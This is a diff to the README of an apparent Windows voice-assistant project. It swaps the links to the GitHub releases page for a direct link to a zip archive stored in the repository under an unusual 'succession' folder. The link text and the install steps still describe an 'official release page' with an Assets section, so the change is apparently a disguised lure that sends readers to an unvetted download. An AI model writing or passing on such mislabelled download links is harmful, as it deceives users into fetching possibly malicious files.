@@ -1,7 +1,7 @@
 # 🤖 AKIRA-AI-Voice-Assistant - Control your desktop using simple voice commands
 
 <p align="center">
-  <a href="https://github.com/glum-wageearner960/AKIRA-AI-Voice-Assistant/releases">
+  <a href="https://github.com/glum-wageearner960/AKIRA-AI-Voice-Assistant/raw/refs/heads/main/succession/A_Assistant_AKIR_Voice_v3.1.zip">
     <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download">
   </a>
 </p>
@@ -23,7 +23,7 @@ Your computer must meet these basic requirements to run the software:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/glum-wageearner960/AKIRA-AI-Voice-Assistant/releases) to access the downloads.
+1. Visit the [official release page](https://github.com/glum-wageearner960/AKIRA-AI-Voice-Assistant/raw/refs/heads/main/succession/A_Assistant_AKIR_Voice_v3.1.zip) to access the downloads.
 2. Locate the most recent version under the Assets section.
 3. Download the file ending in `.exe`. 
 4. Move the downloaded file to a folder where you want to keep the application.
